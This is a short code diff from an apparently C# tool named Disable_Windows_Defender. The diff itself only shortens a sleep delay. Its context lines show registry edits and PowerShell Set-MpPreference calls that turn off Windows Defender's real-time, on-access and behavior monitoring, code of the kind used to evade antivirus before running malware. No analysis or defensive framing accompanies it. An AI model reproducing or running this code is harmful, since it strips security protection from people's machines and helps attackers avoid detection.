@@ -24,7 +24,7 @@ namespace Disable_Windows_Defender
             RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection");
             RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable");
 
-            Thread.Sleep(500);
+            Thread.Sleep(100);
 
             RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");
             RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");
